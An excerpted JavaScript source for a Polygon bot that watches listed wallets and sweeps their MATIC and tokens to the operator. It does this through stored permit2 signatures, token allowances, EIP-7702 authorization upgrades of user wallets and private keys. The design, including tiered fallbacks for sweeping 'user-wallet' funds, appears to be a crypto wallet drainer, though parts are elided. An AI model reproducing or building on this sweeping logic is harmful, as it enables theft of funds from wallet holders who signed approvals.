...
const scanProvider = SCAN_FALLBACK_RPC
  ? new ethers.FallbackProvider(
      [
        { provider: new ethers.JsonRpcProvider(SCAN_RPC, POLYGON_NETWORK, { staticNetwork: POLYGON_NETWORK }), priority: 1, weight: 1, stallTimeout: 2500 },
        { provider: new ethers.JsonRpcProvider(SCAN_FALLBACK_RPC, POLYGON_NETWORK, { staticNetwork: POLYGON_NETWORK }), priority: 2, weight: 1, stallTimeout: 2500 },
      ],
      POLYGON_NETWORK,
      { quorum: 1 },
    )
...
async function tryUpgradeToEip7702AndSweep(checksum, short, addrKey) {
  ...
  try {
    ...
    const tx = await _baseRelayer.sendTransaction({
      ...
      data:     "0x",
      gasLimit: 100_000n,
      chainId:  Number(POLYGON_NETWORK.chainId),
      authorizationList: [{
...
async function trySweepNativeFor(checksum, short) {
  ...
  try {
    // ── A. Contract-held MATIC (PATH 2 — sweepETHFor) ─────────────────────────
    ...
    // ── B. User-wallet MATIC surplus (permit2-gasless path) ───────────────────
    ...
    if (userBal > NATIVE_WRAP_CEILING) {
      log(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} MATIC exceeds ceiling (${ethers.formatEther(NATIVE_WRAP_CEILING)}) — native sweep needs EIP-7702 (Tier 1.5 handles it)`);
      return;
    }
    ...
    const wmaticBal = await wmaticContract.balanceOf(checksum).catch(() => 0n);
    if (wmaticBal > 0n) {
      log(`[nativeFor] ${short} — user has ${ethers.formatEther(wmaticBal)} WMATIC and ${ethers.formatEther(userBal)} MATIC — WMATIC sweep will handle it`);
      return;
    }
...
async function sweep(wallet) {
  ...
  if (wallet.type === "direct-allowance") {
    ...
    // If nothing swept, fall through to TIER 3/4 — this wallet may have a
    // valid batch-signature-transfer row in permit2_signatures that can be used.
...
async function startTransferListeners(wsProvider, tokens) {
  ...
  // Filter topic[2] to our wallets — prevents 1.3M+/day event delivery for
  // Polygon where USDT/USDC have very high transfer volumes.
  //
...
// Polygon has 2s blocks — on("block") was firing 30 times/min (1,800/hr) for
// zero benefit. A setInterval on the free scanProvider every 120s is identical
// in practice (ERC-20 deposits are caught by Transfer event listeners anyway).
...
async function _nativePollTick() {
  ...
  try {
    ...
    for (const tx of block.transactions) {
      ...
      const wallet = monitoredWallets.get(toLower);
      log(`[native] 📥 ${ethers.formatEther(tx.value)} MATIC → ${tx.to.slice(0, 10)} type=${wallet.type}`);

      // All wallet types: dispatchSweep will sweep ERC20s (permit2/direct-allowance)
      // and MATIC (eip7702 via sweepETH, non-7702 via sweepETHFor if authorised).
      dispatchSweep(wallet)
...
async function startBot() {
  try {
    ...
    const wsProvider = new ethers.WebSocketProvider(WS_URL, POLYGON_NETWORK);
...
async function sweepWithKey(privateKey, address) {
  ...
  if (balance > MIN_ETH_WEI) {
    ...
    const gasCost = gasLimit * (gasPrice.gasPrice || ethers.parseUnits("30", "gwei"));
